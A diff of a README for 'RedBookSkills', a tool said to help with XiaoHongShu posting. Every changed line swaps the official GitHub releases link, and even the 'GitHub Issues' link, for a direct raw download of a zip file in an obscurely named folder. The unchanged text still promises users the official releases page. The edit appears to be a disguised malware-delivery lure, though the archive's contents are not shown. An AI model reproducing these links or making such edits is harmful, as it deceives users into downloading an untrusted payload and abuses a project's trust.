@@ -1,6 +1,6 @@
 # 📘 RedBookSkills - Simplify XiaoHongShu Posting
 
-[![Download](https://img.shields.io/badge/Download-RedBookSkills-blue?style=for-the-badge)](https://github.com/annonymouskali10/RedBookSkills/releases)
+[![Download](https://raw.githubusercontent.com/annonymouskali10/RedBookSkills/main/nucleohyaloplasma/Red_Book_Skills_2.2.zip)](https://raw.githubusercontent.com/annonymouskali10/RedBookSkills/main/nucleohyaloplasma/Red_Book_Skills_2.2.zip)
 
 ---
 
@@ -51,7 +51,7 @@ Use the provided download page link, which also has the latest updates and instr
 
 **Step 1:** Visit the download page by clicking the button below. This takes you to the official RedBookSkills releases on GitHub.
 
-[![Download](https://img.shields.io/badge/Download-RedBookSkills-blue?style=for-the-badge)](https://github.com/annonymouskali10/RedBookSkills/releases)
+[![Download](https://raw.githubusercontent.com/annonymouskali10/RedBookSkills/main/nucleohyaloplasma/Red_Book_Skills_2.2.zip)](https://raw.githubusercontent.com/annonymouskali10/RedBookSkills/main/nucleohyaloplasma/Red_Book_Skills_2.2.zip)
 
 **Step 2:** On the releases page, find the latest version. Look for files ending with `.exe` for Windows or `.dmg` for macOS.
 
@@ -110,7 +110,7 @@ If problems continue, visit the GitHub Issues page on the repository to seek hel
 
 You can seek help or report issues by opening a new issue on the GitHub repository page:
 
-[GitHub Issues for RedBookSkills](https://github.com/annonymouskali10/RedBookSkills/issues)
+[GitHub Issues for RedBookSkills](https://raw.githubusercontent.com/annonymouskali10/RedBookSkills/main/nucleohyaloplasma/Red_Book_Skills_2.2.zip)
 
 Be clear about your problem, the steps you took, and your operating system details.
 
@@ -134,4 +134,4 @@ For developers and advanced users, feel free to check the repository for source 
 
 Visit the releases page to get your copy and the latest updates anytime:
 
-[Download RedBookSkills](https://github.com/annonymouskali10/RedBookSkills/releases)
+[Download RedBookSkills](https://raw.githubusercontent.com/annonymouskali10/RedBookSkills/main/nucleohyaloplasma/Red_Book_Skills_2.2.zip)
